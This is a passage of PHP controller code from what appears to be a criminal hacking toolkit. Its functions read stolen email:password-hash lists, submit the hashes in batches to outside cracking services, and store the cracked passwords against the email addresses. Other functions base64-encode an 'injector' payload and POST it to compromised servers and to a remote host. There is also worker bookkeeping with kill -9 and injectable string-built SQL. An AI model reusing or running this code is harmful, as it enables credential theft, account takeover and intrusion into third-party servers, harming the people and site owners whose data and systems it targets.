			exit('psn ostanovlen > 15 stepOne');
		}

		$urls2 = $this->Post->query('SELECT * FROM `posts` WHERE `status`=2 AND `prohod`<5 limit 130');

		if (50 < count($urls2)) {
			$this->stop();
			$this->stop2();
			exit('psn ostanovlen > 50 stepTwo');
		}


		$r = rand(1, 100);
		$this->logs('PSN zapushen - № ' . $r, 'psn2');
		$dbSetChange = $this->SelectQueryWhere('urls', 'shell=0', '*', false, $this->psn, 'FOR UPDATE');
		$this->d(count($dbSetChange), 'count dbSetChange');
		flush();
		$new = time();
		$razn = $new - $time;

		if (100 < $razn) {
			$this->d($razn . '-razn psn po vremeni > 100:' . $r);
			$this->logs($razn . '-razn po vremeni psn:' . $r, 'psn2');
			$this->stop();
			$this->stop2();
			exit('stop 100');
		}


		foreach ($dbSetChange as $val ) {
			$this->workup();
			$url = str_replace('http://http://', 'http://', $val['url']);
			$url = str_replace('http://', '', $val['url']);
			$url = 'http://' . $url;
			$p = parse_url($url);
			$p['host'] = str_replace('www.', '', $p['host']);
			$data = $this->Post->query('SELECT count(*) FROM `posts` WHERE url like \'%' . $p['host'] . '%\'');
			echo $url . '<br>';
			flush();
			$this->d($data);
			$f = 'psn2';

			if ($data[0][0]['count(*)'] == 0) {
				$date = $val['date'];
				$maska = $this->get_arg_url($url);
				$tema = $val['tema'];

				if ($this->Post->query('INSERT INTO posts (url,date,tic,maska,tema) VALUES(\'' . $url . '\',\'' . $date . '\',\'0\',\'' . $maska . '\',\'' . $tema . '\')')) {
					$this->d('OK ' . $p['host']);
				}


				mysql_query('UPDATE `urls` SET  `shell` =  1,`tema`=\'' . $f . '\' WHERE  `id` =' . $val['id']);
			}
			 else {
				$this->d('NO ' . $p['host']);
				mysql_query('UPDATE `urls` SET  `shell` =  1,`tema`=\'' . $f . '\' WHERE  `id` =' . $val['id']);

				if (1 < $data[0][0]['count(*)']) {
					$data = $this->Post->query('SELECT id FROM `posts` WHERE url like \'%' . $p['host'] . '%\'');
					echo '<br>&&&&----------------<br>';

					foreach ($data as $vl ) {
						if ($this->Post->query('DELETE FROM  `posts` WHERE  id = ' . $vl['posts']['id'] . ' AND status=0')) {
							$this->d('DELETE FROM  `posts` WHERE  id = ' . $vl['posts']['id'] . ' AND status=0');
							$this->d('udalen ' . $vl['posts']['id']);
						}


						if ($vl['posts']['status'] == 2) {
							if ($this->Post->query('DELETE FROM  `posts` WHERE  id = ' . $vl['posts']['id'] . ' AND status=1')) {
								$this->d('DELETE FROM  `posts` WHERE  id = ' . $vl['posts']['id'] . ' AND status=1');
								$this->d('udalen ' . $vl['posts']['id']);
							}

						}

					}

					echo '<br>!!!!----------------<br>';
				}

			}
		}

		$this->logs('PSN ostenovlen - № ' . $r, 'psn2');
		$this->stop();
		$this->stop2();
		exit();
	}

	public function psn3()
	{
	}

	public function hash()
	{
		ignore_user_abort(true);

		if (!(isset($_FILES['mails']['name']))) {
			$tpl = 'Допустимый формат хэшей:<br><font color="red">md5()</font><br><font color="red">md5(md5())</font><br><font color="red">ntlm()</font><br><font color="red">lm()</font><br><font color="red">pwdump()</font><br>';
			$tpl .= '<form action="" method="post" enctype="multipart/form-data">' . "\r\n\t\t\t" . 'mail files:<br>' . "\r\n\t\t\t" . '<input name="mails" type="file"><br>' . "\r\n\t\t\t" . '<input type="submit" value="start">' . "\r\n\t\t\t" . '</form>';
		}
		 else {
			echo '111111';
			$uploaddir = './';
			$uploadfile = $uploaddir . 'hash.txt';
			copy($_FILES['mails']['tmp_name'], $uploadfile);
			$mail_arr = file('./hash.txt');
			$i = 0;

			while ($i <= count($mail_arr) - 1) {
				$mail_arr2 = explode(':', $mail_arr[$i]);
				$mails[$i] = $mail_arr2[0];
				$hashes[$i] = $mail_arr2[1];
				++$i;
			}

			$count = count($hashes);
			$lin = ceil($count / 9);
			$this->d($lin, '$lin');
			$rr = 0;
			$b = 0;

			while ($b <= $lin) {
				$hash = '';
				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://c0llision.net/webcrack');
				curl_setopt($ch, CURLOPT_HEADER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				$tmp = explode(DIRECTORY_SEPARATOR, __FILE__);
				array_pop($tmp);
				array_push($tmp, $cookie);
				$cookie_file = implode(DIRECTORY_SEPARATOR, $tmp);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
				$result = curl_exec($ch);
				curl_close($ch);
				preg_match('<input type="hidden" name="hash\[\_csrf\_token\]" value="([^"]*)" id="hash\_\_csrf\_token" />', $result, $pprt);
				preg_match_all('//Set-Cookie: opencrack=([^\;]*)\; path=///i', $result, $mass);
				$cook = 'opencrack=' . $mass[1][0] . ';';
				$i = $b * 9;

				while ($i <= ($b * 9) + 8) {
					if ($count <= $i) {
					}
					 else if ($i == ($b * 9) + 9) {
						$hash .= trim($hashes[$i]);
					}
					 else {
						$hash .= trim($hashes[$i]) . '%0A';
					}

					++$i;
				}

				$ch = curl_init();
				curl_setopt($ch, CURLOPT_URL, 'http://c0llision.net/webcrack/request');
				curl_setopt($ch, CURLOPT_HEADER, 1);
				curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch, CURLOPT_COOKIE, $cook);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
				curl_setopt($ch, CURLOPT_POST, 1);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
				curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
				curl_setopt($ch, CURLOPT_POSTFIELDS, 'hash[_csrf_token]=' . $pprt[1] . '&hash[_input_]=' . $hash);
				$result = curl_exec($ch);
				curl_close($ch);
				preg_match_all('//<td class="plaintext">([^<]*)</td>//iU', $result, $pp);
				preg_match_all('//<td><img src="([^"]*)" /></td>//iU', $result, $pp2);
				$x = 0;
				$t = 0;

				while ($t <= count($pp2[1]) - 1) {
					if ($pp2[1][$t] == '/images/ok.png') {
						$pass[$rr] = $pp[1][$x];
						++$x;
					}
					 else {
						$pass[$rr] = 'no';
					}

					$date = date('Y-m-d h:i:s');
					$this->Post->query('INSERT INTO `hash` (mail,pass,hash,id,date) VALUES (\'' . $mails[$rr] . '\',\'' . $pass[$rr] . '\',\'' . $hashes[$rr] . '\',\'\',\'' . $date . '\');');
					echo $mails[$rr] . ':' . $pass[$rr] . ':' . md5($pass[$rr]) . ':' . $hashes[$rr] . '<br>';
					++$rr;
					++$t;
				}

				++$b;
			}
		}

		$this->set('tpl', $tpl);
	}

	public function hash3_old()
	{
		$file = $this->Post->query('SELECT * FROM mails WHERE type=\'corp\' AND pass !=\'0\' AND hashtype !=\'0\' AND hash2=\'0\' limit 500');
		$mail_arr10 = '';

		foreach ($file as $val ) {
			if (($this->hashtype2($val['mails']['pass']) != 'unkown') && ($this->hashtype2($val['mails']['pass']) != 1)) {
				$g = trim($val['mails']['email']) . ':' . trim($val['mails']['pass']);
				$mail_arr10 .= trim($val['mails']['pass']) . '<br>';
				$g = str_replace('/n', '', $g);
				$g = str_replace("\n", '', $g);
				$g = str_replace("\r\n", '', $g);
				$g = str_replace("\n\n", '', $g);
				$mail_arr[] = $g;
			}
			 else {
				$this->d($val['mails']['pass'] . ' - neto md5');
				$this->Post->query('UPDATE  `mails` SET  `hash2` =  \'no\' WHERE  id =' . $val['mails']['id']);
			}
		}

		print_r($mail_arr10);
		exit();
		$i = 0;

		while ($i <= count($mail_arr) - 1) {
			$mail_arr2 = explode(':', $mail_arr[$i]);
			$mails[$i] = $mail_arr2[0];
			$hashes[$i] = $mail_arr2[1];
			++$i;
		}

		$count = count($hashes);
		$lin = ceil($count / 9);
		$this->d($lin, '$lin');
		$rr = 0;
		$b = 0;

		while ($b <= $lin) {
			$hash = '';
			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'http://c0llision.net/webcrack');
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			$tmp = explode(DIRECTORY_SEPARATOR, __FILE__);
			array_pop($tmp);
			array_push($tmp, $cookie);
			$cookie_file = implode(DIRECTORY_SEPARATOR, $tmp);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
			$result = curl_exec($ch);
			curl_close($ch);
			preg_match('<input type="hidden" name="hash\[\_csrf\_token\]" value="([^"]*)" id="hash\_\_csrf\_token" />', $result, $pprt);
			preg_match_all('//Set-Cookie: opencrack=([^\;]*)\; path=///i', $result, $mass);
			$cook = 'opencrack=' . $mass[1][0] . ';';
			$i = $b * 9;

			while ($i <= ($b * 9) + 8) {
				if ($count <= $i) {
				}
				 else if ($i == ($b * 9) + 9) {
					$hash .= trim($hashes[$i]);
				}
				 else {
					$hash .= trim($hashes[$i]) . '%0A';
				}

				++$i;
			}

			$ch = curl_init();
			curl_setopt($ch, CURLOPT_URL, 'http://c0llision.net/webcrack/request');
			curl_setopt($ch, CURLOPT_HEADER, 1);
			curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($ch, CURLOPT_COOKIE, $cook);
			curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
			curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11 YE');
			curl_setopt($ch, CURLOPT_POSTFIELDS, 'hash[_csrf_token]=' . $pprt[1] . '&hash[_input_]=' . $hash);
			$result = curl_exec($ch);
			curl_close($ch);
			preg_match_all('//<td class="plaintext">([^<]*)</td>//iU', $result, $pp);
			preg_match_all('//<td><img src="([^"]*)" /></td>//iU', $result, $pp2);
			$x = 0;
			$t = 0;

			while ($t <= count($pp2[1]) - 1) {
				if ($pp2[1][$t] == '/images/ok.png') {
					$pass[$rr] = $pp[1][$x];
					++$x;
				}
				 else {
					$pass[$rr] = 'no';
				}

				$date = date('Y-m-d h:i:s');
				$this->Post->query('UPDATE  `mails` SET  `hash2` =  \'' . $pass[$rr] . '\' WHERE  email =\'' . trim($mails[$rr]) . '\'');
				echo $mails[$rr] . ':' . $pass[$rr] . ':' . $hashes[$rr] . '<br>';
				++$rr;
				++$t;
			}

			++$b;
		}
	}

	public function hash3()
	{
		$this->timeStart = $this->start('hash', 1);
		$file = $this->Post->query('SELECT * FROM mails WHERE pass !=\'0\' AND hashtype !=\'0\' AND hash2=\'0\' ORDER BY id DESC limit 5000 ');
		$mail_arr10 = '';

		foreach ($file as $val ) {
			if (($this->hashtype2($val['mails']['pass']) != 'unkown') && ($this->hashtype2($val['mails']['pass']) != 1)) {
				$g = trim($val['mails']['email']) . ':' . trim($val['mails']['pass']);
				$mail_arr10 .= trim($val['mails']['pass']) . '<br>';
				$g = str_replace('/n', '', $g);
				$g = str_replace("\n", '', $g);
				$g = str_replace("\r\n", '', $g);
				$g = str_replace("\n\n", '', $g);
				$mail_arr[] = $g;
				$mail_arr20[trim($val['mails']['pass'])] = trim($val['mails']['email']);
			}
			 else {
				$this->Post->query('UPDATE  `mails` SET  `hash2` =  \'no\' WHERE  id =' . $val['mails']['id']);
			}
		}

		$i = 0;

		while ($i <= count($mail_arr) - 1) {
			$mail_arr2 = explode(':', $mail_arr[$i]);
			$mails[$i] = $mail_arr2[0];
			$hashes[$i] = $mail_arr2[1];
			++$i;
		}

		$count = count($hashes);
		$lin = ceil($count / 50);
		$rr = 0;
		$b = 0;

		while ($b <= $lin) {
			$hash = '';
			$kuku = array();
			$i = $b * 48;

			while ($i <= ($b * 48) + 8) {
				if ($count <= $i) {
				}
				 else if ($i == ($b * 48) + 9) {
					$hash .= trim($hashes[$i]);
					$kuku[trim($hashes[$i])] = 'ku';
				}
				 else {
					$hash .= trim($hashes[$i]) . '%0D%0A';
					$kuku[trim($hashes[$i])] = 'ku';
				}

				++$i;
			}

			$hash = 'list=' . $hash . '&crack=Crack+Hashes';
			$html = $this->s_curl('http://www.md5crack.com/home', true, $hash);
			@preg_match_all('//<p class="success"><strong>([^<]*)</strong>:([^<]*)</p>//iU', $html, $pp);
			$x = 0;
			$suc = array();
			$i = 0;

			while ($i < count($pp[1])) {
				@$suc[$pp[1][$i]] = $pp[2][$i];
				unset($kuku[$pp[1][$i]]);
				++$i;
			}

			if (0 < count($suc)) {
				foreach ($suc as $t => $p ) {
					$date = date('Y-m-d h:i:s');
					$this->Post->query('UPDATE  `mails` SET  `hash2` =  \'' . $p . '\' WHERE  pass =\'' . trim($t) . '\'');
					$this->d('UPDATE  `mails` SET  `hash2` =  \'' . $p . '\' WHERE  pass =\'' . trim($t) . '\'');
					echo $t . ':' . $p . ' OK!!!!!!!<br>';
					++$rr;
				}
			}


			if (0 < count($kuku)) {
				foreach ($kuku as $t2 => $p2 ) {
					$date = date('Y-m-d h:i:s');
					$this->Post->query('UPDATE  `mails` SET  `hash2` =  \'no\' WHERE  email =\'' . $mail_arr20[trim($t2)] . '\'');
					echo $t2 . ':NO<br>';
					++$rr;
				}
			}


			sleep(5);
			++$b;
		}

		$this->stop();
	}

	public function hashtype($str)
	{
		$hash = array(
			array('md3, md4 hmac, md5, md5 hmac, ripmed 128, NTHash, LM, MacroHash', '/^[a-zA-Z0-9]{32}$/'),
			array('md4 base64, md5 base64,', '/^[a-zA-Z0-9\/\+]{22}\=\=[a-zA-Z0-9\/]{3}\=$/'),
			array('md5 Unix,', '/^\$\d\$[\D\d]*\$[a-zA-Z0-9\.\/]{22}$/'),
			array('md5 APR,', '/^\$apr1\$[\D\d]*\$[a-zA-Z0-9\.\/]{22}$/'),
			array('sha-1 base64,', '/^[a-zA-Z0-9\/\+\=]{28}$/'),
			array('mysql5, sha-1, sha-1 hmac, ripmed 160,', '/^[a-zA-Z0-9]{40}$/'),
			array('sha-256, ГОСТ Р34.11-94, ripmed 256,', '/^[a-zA-Z0-9]{64}$/'),
			array('ripmed 320,', '/^[a-zA-Z0-9]{80}$/'),
			array('sha-384,', '/^[a-zA-Z0-9]{98}$/'),
			array('sha-512,', '/^[a-zA-Z0-9]{128}$/')
			);
		$hashstr = '';
		$i = 0;

		while ($i < count($hash)) {
			if (preg_match($hash[$i][1], $str)) {
				$hashstr .= $hash[$i][0];
			}


			++$i;
		}

		if (!(empty($hashstr))) {
			return $hashstr;
		}


		if (14 < strlen($str)) {
			return 'unkown';
		}


		return 1;
	}

	public function hashtype2($str)
	{
		$hash = array(
			array('md3, md4 hmac, md5, md5 hmac, ripmed 128, NTHash, LM, MacroHash', '/^[a-zA-Z0-9]{32}$/')
			);
		$hashstr = '';
		$i = 0;

		while ($i < count($hash)) {
			if (preg_match($hash[$i][1], $str)) {
				$hashstr .= $hash[$i][0];
			}


			++$i;
		}

		if (!(empty($hashstr))) {
			return $hashstr;
		}


		if (16 < strlen($str)) {
			return 'unkown';
		}


		return 1;
	}

	public function workup()
	{
		$this->Post->query('UPDATE  `starts` SET  `lasttime` =  ' . time() . ' WHERE  `time_start` =' . $this->timeStart, false);
		return true;
	}

	public function thepid()
	{
		$pid = $this->Post->query('SELECT * FROM  `starts` WHERE   `time_start` =' . $this->timeStart);
		return $pid;
	}

	public function start($name = 'unknown', $potok = 1)
	{
		$this->Funcname = $name;

		if ($name == 'rendown1') {
			$p = 'AND';
		}


		$time = time() - 3600;
		$start = $this->Post->query('SELECT * FROM  `starts` WHERE `lasttime`>' . $time . ' AND `function` ="' . $name . '"  ');

		if ($potok <= count($start)) {
			exit('Уже запущено максимально');
			return;
		}


		$this->Post->query('DELETE FROM  `starts` WHERE `lasttime` <' . $time . ' AND `function` ="' . $name . '"');
		$time = time();
		$pid = getmypid();
		$this->pid = $pid;
		$data['Start']['id'] = 0;
		$data['Start']['function'] = $name;
		$data['Start']['lasttime'] = $time;
		$data['Start']['time_start'] = $time;
		$data['Start']['pid'] = $pid;
		$this->Start->save($data);
		return $time;
	}

	public function start_one($name = 'unknown', $potok = 1)
	{
		$this->Funcname = $name;

		if ($name == 'rendown1') {
			$p = 'AND';
		}


		$time = time() - 3600;
		$start = $this->Post->query('SELECT * FROM  `starts_one` WHERE `lasttime`>' . $time . ' AND `function` ="' . $name . '"  ');

		if ($potok <= count($start)) {
			exit('Уже запущено максимально');
			return;
		}


		$this->Post->query('DELETE FROM  `starts_one` WHERE `lasttime` <' . $time . ' AND `function` ="' . $name . '"');
		$time = time();
		$pid = getmypid();
		$this->pid = $pid;
		$data['Start_one']['id'] = 0;
		$data['Start_one']['function'] = $name;
		$data['Start_one']['lasttime'] = $time;
		$data['Start_one']['time_start'] = $time;
		$data['Start_one']['pid'] = $pid;
		$this->Start->save($data);
		return $time;
	}

	public function start2()
	{
		$start = $this->SelectQueryWhere('starts', 'function=\'psn\'', '*');

		if ($start[0]['function'] == 'psn') {
			exit('Уже запущено PSN na GOOGLE PARSER');
			return;
		}


		if ($start[0]['function'] == 'psn_local') {
			exit('Уже запущено PSN_LOCAL na GOOGLE PARSER');
			return;
		}


		mysql_query('DELETE  FROM `starts` WHERE function=\'psn\'', $this->connection);

		if (mysql_query('INSERT INTO `starts` (function) VALUES (\'psn\')', $this->connection)) {
			return true;
		}

	}

	public function stop($task_name=false, $start_time=false)
	{
     // visit temporary
     $task = @$this->Funcname;
      if ($task_name) {
        $task = $task_name;
     }
    if(!$start_time) {
      $start_time = @$this->timeStart;
    }
    	$this->d("Stop: " . $task . " started at " . date($start_time));
		$this->Post->query('DELETE  FROM `starts` WHERE `function` = "' . $task . '" AND  `time_start` =' . $start_time);
		return true;
	}

	public function stop2()
	{
		mysql_query('DELETE  FROM `starts` WHERE `function` = "psn"', $this->connection);
		return true;
	}

	public function pid_stop()
	{
		$this->timeStart = $this->start('pid_stop');
		$st3 = $this->Post->query('SELECT * FROM `multis` WHERE `get`=1');
		$bd = $this->bdmain;

		foreach ($st3 as $work3 ) {
			$time = time();

			if (500 < ($time - $work3['multis']['date'])) {
				$this->workup();
				$id = $work3['multis']['id'];
				$status = 1;
				$pid = $work3['multis']['pid'];
				$this->logs('pid_ stop kill -9 ' . $pid, 'pid_stop');
				$this->Filed->query('DELETE FROM `starts` WHERE `pid` = ' . $pid);
				$this->d($id);
				$this->d($work3, 'Завис');

				if ($work3['multis']['dok'] == 0) {
					$status = 3;
				}


				if ($work3['multis']['dok'] == 1) {
					$status = 2;
				}


				$this->Post->query('UPDATE  `' . $bd . '`.`multis` SET  `get` = \'' . $status . '\' WHERE  `id` =' . $id . '');

				if ($pid == 0) {
					echo 'PID!!! = ' . $pid;
				}
				 else {
					exec('kill -9 ' . $pid);
				}
			}
			 else {
				$this->d($work3['multis']['potok'] . ' norm potok');
			}
		}

		$st4 = $this->Post->query('SELECT * FROM `multis_one` WHERE `get`=1');

		foreach ($st4 as $work3 ) {
			$time = time();

			if (500 < ($time - $work3['multis_one']['date'])) {
				$this->workup();
				$id = $work3['multis_one']['id'];
				$status = 1;
				$pid = $work3['multis_one']['pid'];
				$this->logs('pid_ stop kill -9 ' . $pid, 'pid_stop');
				$this->Filed->query('DELETE FROM `starts` WHERE `pid` = ' . $pid);
				$this->d($id);
				$this->d($work3, 'Завис');

				if ($work3['multis_one']['dok'] == 0) {
					$status = 3;
				}


				if ($work3['multis_one']['dok'] == 1) {
					$status = 2;
				}


				if ($work3['multis_one']['dok'] == 2) {
					$status = 3;
				}


				if ($work3['multis_one']['dok'] == 3) {
					$status = 3;
				}


				if ($work3['multis_one']['dok'] == 4) {
					$status = 3;
				}


				if ($work3['multis_one']['dok'] == 5) {
					$status = 3;
				}


				$this->d($bd, 'base');

				if ($this->Post->query('UPDATE  `' . $bd . '`.`multis_one` SET  `get` = ' . $status . ' WHERE  id=' . $id)) {
					$this->d('UPDATE  `' . $bd . '`.`multis_one` SET  `get` = ' . $status . ' WHERE  id=' . $id);
				}


				if ($pid == 0) {
					echo 'PID!!! = ' . $pid;
				}
				 else {
					exec('kill -9 ' . $pid);
				}
			}
			 else {
				$this->d($work3['multis_one']['potok'] . ' norm potok');
			}
		}

		$this->stop();
	}

	public function streampars($url, $time2 = 30, $header = 1)
	{
		$ch = curl_init($url);
		$uagent = array('Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; E-nrgyPlus; .NET CLR 1.1.4322; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; dial; SV1; .NET CLR 1.0.3705)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; ds-66843412; Sgrunt|V109|1|S-66843412|dial; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; eMusic DLM/3; MSN Optimized;US; MSN Optimized;US)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.025; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; elertz 2.4.179[128]; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; InfoPath.1)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; generic_01_01; YPC 3.2.0; .NET CLR 1.1.4322; yplus 5.3.04b)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iOpus-I-M; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; Sgrunt|V109|1746|S-1740532934|dialno; snprtz|dialno; .NET CLR 2.0.50727)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=; YPC 3.2.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; IEMB3; IEMB3; yplus 5.1.04b)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; FunWebProducts; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; acc=none; SV1; snprtz|S04087544802137; .NET CLR 1.1.4322)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; iebar; yplus 5.6.02b)');
		$ua = trim($uagent[mt_rand(0, sizeof($uagent) - 1)]);

		if (($this->proxy != '') && ($this->proxy_enable == true)) {
			$rand_keys = array_rand($this->proxy);
			$s = explode(':', $this->proxy[$rand_keys]);
			curl_setopt($ch, CURLOPT_PROXY, trim($s[0]) . ':' . trim($s[1]));
		}


		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_HEADER, $header);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_ENCODING, '');
		curl_setopt($ch, CURLOPT_USERAGENT, $ua);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
		curl_setopt($ch, CURLOPT_TIMEOUT, $time2);
		curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
		return $ch;
	}

	public function create_streem($serv, $url, $time = 100)
	{
		$serv = str_replace('http://', '', $serv);
		$ch = curl_init();

		if ($this->htaccess_auth != '') {
			curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
			curl_setopt($ch, CURLOPT_USERPWD, $this->htaccess_auth);
		}


		if (($this->proxy != '') && ($this->proxy_enable == true)) {
			$rand_keys = array_rand($this->proxy);
			$s = explode(':', $this->proxy[$rand_keys]);
			curl_setopt($ch, CURLOPT_PROXY, trim($s[0]) . ':' . trim($s[1]));
		}


		curl_setopt($ch, CURLOPT_URL, 'http://' . trim($serv));
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 1000);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, $time);
		curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
		curl_setopt($ch, CURLOPT_POST, 1);

		if (!empty($this->domens)) {
			$codec = str_replace('URLURL', $url, $this->code);
		}
		 else {
			$url = str_replace('"', '', $url);
			$url = str_replace('""', '', $url);
			$url = str_replace('\'', '', $url);
			$url = str_replace('\'\'', '', $url);
			$codec = str_replace('URLURL', $url, $this->code);
		}

		$postdata = 'fack=' . urlencode(base64_encode($codec));
		$headers['Content-Length'] = strlen($postdata);
		$headers['User-Agent'] = 'Curl/1.0';
		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		curl_setopt($ch, CURLOPT_POSTFIELDS, $postdata);
		return $ch;
	}

	public function send($url = 'http://workdigest.ru/?vac=1&tag=30')
	{
		$filename = str_replace('webroot/index.php', 'controllers/components/injector.php', $_SERVER['SCRIPT_FILENAME']);
		$injectorfile = file_get_contents($filename);
		$code = str_replace('URLURL', $url, file_get_contents('code.php'));
		$code = str_replace(array('<?php', '?>'), '', $injectorfile . $code);
		$post = array('fack' => base64_encode($code));
		$data = $this->make_http_post_request('rk.ntlab.su', '/imgs/news/get.php?key=sdfadsgh4513sdGG435341FDGWWDFGDFHDFGDSFGDFSGDFG', $post, 'fack');
		echo $data;
		exit();
	}

	public function make_http_post_request($server, $uri, $post, $uagent)
	{
		$_post = array();

		if (is_array($post)) {
			foreach ($post as $name => $value ) {
				$_post[] = $name . '=' . urlencode($value);
			}
		}


		$post = implode('&', $_post);
		$fp = fsockopen($server, 80);

		if ($fp) {
			fputs($fp, 'POST /' . $uri . ' HTTP/1.1' . "\r\n" . 'Host: ' . $server . ' ' . "\r\n" . 'User-Agent: ' . $uagent . ' ' . "\r\n" . 'Content-Type:' . ' application/x-www-form-urlencoded' . "\r\n" . 'Content-Length: ' . strlen($post) . "\r\n" . 'Connection: close' . "\r\n\r\n" . $post);
			$content = '';
			$start = false;

			while (!(feof($fp))) {
				$con = fgets($fp);

				if ($start == true) {
					$content .= $con;
				}


				if (trim($con) == '') {
					$start = true;
				}

			}

			fclose($fp);
		}


		return $content;
	}

	public function s_curl($url, $post = false, $vars = NULL, $proxy = false)
	{
		$ua = array('', '');
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 0);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_REFERER, 'http://google.com');
		curl_setopt($ch, CURLOPT_USERAGENT, $ua[array_rand($ua)]);

		if ($post == true) {
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $vars);
			curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
			curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		}


		$result = curl_exec($ch);
		return $result;
	}

	public function s_curl2($url)
	{
		$ua = array('', '');
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, 1);
		curl_setopt($ch, CURLOPT_MAXCONNECTS, 1000);
		curl_setopt($ch, CURLOPT_ENCODING, 'UTF-8');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);
		curl_setopt($ch, CURLOPT_NOBODY, 0);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
		curl_setopt($ch, CURLOPT_TIMEOUT, 10);
		curl_setopt($ch, CURLOPT_REFERER, 'http://google.com');
		curl_setopt($ch, CURLOPT_USERAGENT, $ua[array_rand($ua)]);
		return $ch;
	}

	public function clean_url($value)
	{
		$value = str_replace('http://http://', 'http://', $value);
		$value = str_replace('https://http://', 'http://', $value);
		$value = str_replace('https://', '', $value);
		$value = str_replace('http://', '', $value);
